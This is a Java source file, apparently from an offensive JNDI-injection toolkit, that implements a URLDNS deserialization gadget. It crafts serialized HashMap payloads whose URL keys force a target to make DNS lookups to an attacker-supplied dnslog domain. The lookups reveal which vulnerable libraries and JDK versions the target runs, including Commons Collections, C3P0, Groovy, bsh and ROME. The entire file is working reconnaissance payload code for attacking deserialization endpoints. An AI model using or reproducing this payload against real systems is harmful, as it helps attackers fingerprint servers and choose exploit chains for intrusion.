package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

/**
 * A blog post with more details about this gadget chain is at the url below:
 * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 * <p>
 * This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 * posting describing how he modified the Java Commons Collections gadget
 * in ysoserial to open a URL. This takes the same idea, but eliminates
 * the dependency on Commons Collections and does a DNS lookup with just
 * standard JDK classes.
 * <p>
 * The Java URL class has an interesting property on its equals and
 * hashCode methods. The URL class will, as a side effect, do a DNS lookup
 * during a comparison (either equals or hashCode).
 * <p>
 * As part of deserialization, HashMap calls hashCode on each key that it
 * deserializes, so using a Java URL object as a serialized key allows
 * it to trigger a DNS lookup.
 * <p>
 * Gadget Chain:
 * HashMap.readObject()
 * HashMap.putVal()
 * HashMap.hash()
 * URL.hashCode()
 */
@Dependencies()
@Authors({Authors.GEBL})
public class urldns implements ObjectPayload<Object> {
    public static String[] defaultClass = new String[]{
            "CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux", "jackson2100","fastjson","ROME","SpringAOP"};

    public static List<Object> list = new LinkedList();

    public Object getObject(PayloadType type, String... param) throws Exception {
        String command = param[0];
        int    sep     = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
        }

        String tYPE = command.substring(0, sep);
        String url  = command.substring(sep + 1);

        switch (tYPE) {
            // common 时会测试不常被黑名单禁用的类
            case "common":
                setList("CommonsBeanutils2", url);
                setList("C3P0", url);
                setList("AspectJWeaver", url);
                setList("bsh", url);
                setList("winlinux", url);
                break;

            // all 会测试全部类
            case "all":
                setList("all", url);
                break;

            case "null":
                return getURLDNSGadget(url, null);
            // 默认指定类
            default:
                setList(tYPE, url);
        }

        return list;
    }

    public static Object getURLDNSGadget(String urls, String clazzName) throws Exception {
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        URL                     url     = new URL("http://" + urls);
        Field                   f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, Integer.valueOf(0));
        Class<?> clazz = null;

        if (clazzName != null) {
            try {
                clazz = com.qi4l.jndi.gadgets.utils.Utils.makeClass(clazzName);
            } catch (Exception e) {
                clazz = Class.forName(clazzName);
            }
        }

        hashMap.put(url, clazz);
        f.set(url, Integer.valueOf(-1));
        return hashMap;
    }

    public static void setList(String clazzName, String dnsLog) throws Exception {


        switch (clazzName) {
            case "CommonsCollections13567":
                //CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
                Object cc31or321 = getURLDNSGadget("cc31or321." + dnsLog, "org.apache.commons.collections.functors.ChainedTransformer");
                Object cc322 = getURLDNSGadget("cc322." + dnsLog, "org.apache.commons.collections.ExtendedProperties$1");
                list.add(cc31or321);
                list.add(cc322);
                break;
            case "CommonsCollections24":
                //CommonsCollections2/4链,需要4-4.0版本
                Object cc40 = getURLDNSGadget("cc40." + dnsLog, "org.apache.commons.collections4.functors.ChainedTransformer");
                Object cc41 = getURLDNSGadget("cc41." + dnsLog, "org.apache.commons.collections4.FluentIterable");
                list.add(cc40);
                list.add(cc41);
                break;
            case "CommonsBeanutils2":
                //CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
                Object cb17 = getURLDNSGadget("cb17." + dnsLog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
                Object cb18x = getURLDNSGadget("cb18x." + dnsLog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
                Object cb19x = getURLDNSGadget("cb19x." + dnsLog, "org.apache.commons.beanutils.BeanIntrospectionData");
                list.add(cb17);
                list.add(cb18x);
                list.add(cb19x);
                break;
            case "C3P0":
                //c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
                Object c3p092x = getURLDNSGadget("c3p092x." + dnsLog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
                Object c3p095x = getURLDNSGadget("c3p095x." + dnsLog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
                list.add(c3p092x);
                list.add(c3p095x);
                break;
            case "AspectJWeaver":
                //aspectjweaver,需要cc31
                Object ajw = getURLDNSGadget("ajw." + dnsLog, "org.aspectj.weaver.tools.cache.SimpleCache");
                list.add(ajw);
                break;
            case "bsh":
                //bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
                Object bsh20b4 = getURLDNSGadget("bsh20b4." + dnsLog, "bsh.CollectionManager$1");
                Object bsh20b5 = getURLDNSGadget("bsh20b5." + dnsLog, "bsh.engine.BshScriptEngine");
                Object bsh20b6 = getURLDNSGadget("bsh20b6." + dnsLog, "bsh.collection.CollectionIterator$1");
                list.add(bsh20b4);
                list.add(bsh20b5);
                list.add(bsh20b6);
                break;
            case "Groovy":
                //Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
                Object groovy1702311 = getURLDNSGadget("groovy1702311." + dnsLog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
                Object groovy24x = getURLDNSGadget("groovy24x." + dnsLog, "groovy.lang.Tuple2");
                Object groovy244 = getURLDNSGadget("groovy244." + dnsLog, "org.codehaus.groovy.runtime.dgm$1170");
                list.add(groovy1702311);
                list.add(groovy24x);
                list.add(groovy244);
                break;
            case "Becl":
                //Becl,JDK<8u251
                Object becl = getURLDNSGadget("becl." + dnsLog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
                list.add(becl);
                break;
            case "Jdk7u21":
                //JDK<=7u21
                Object Jdk7u21 = getURLDNSGadget("Jdk7u21." + dnsLog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
                list.add(Jdk7u21);
                break;
            case "JRE8u20":
                //7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
                Object JRE8u20 = getURLDNSGadget("JRE8u20." + dnsLog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
                list.add(JRE8u20);
                break;
            case "winlinux":
                //windows/linux版本判断
                Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
                Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
                list.add(linux);
                list.add(windows);
                break;
            case "jackson2100":
                //jackson-databind>=2.10.0存在一个链
                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.NodeSerialization");
                list.add(jackson2100);
                break;
            case "fastjson":
                Object fastjson = getURLDNSGadget("fastjson." + dnsLog, "com.alibaba.fastjson.JSONArray");
                list.add(fastjson);
                break;
            case "ROME":
                //rome <= 1.11.1
                Object rome1000 = getURLDNSGadget("rome1000."+dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
                Object rome1111 = getURLDNSGadget("rome1111."+dnsLog, "com.rometools.rome.feed.impl.ObjectBean");
                list.add(rome1000);
                list.add(rome1111);
                break;
            case "SpringAOP":
                //fastjon/jackson两个链的变种都需要springAOP
                Object springAOP = getURLDNSGadget("SpringAOP."+dnsLog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
                list.add(springAOP);
                break;
            case "all":
                for (int i = 0; i < defaultClass.length; i++) {
                    setList(defaultClass[i], dnsLog);
                }
                break;
            default:
                Object hm = getURLDNSGadget(clazzName.replace(".", "_").replace("$", "_") + "." + dnsLog, clazzName);
                list.add(hm);
                break;
        }
    }
}
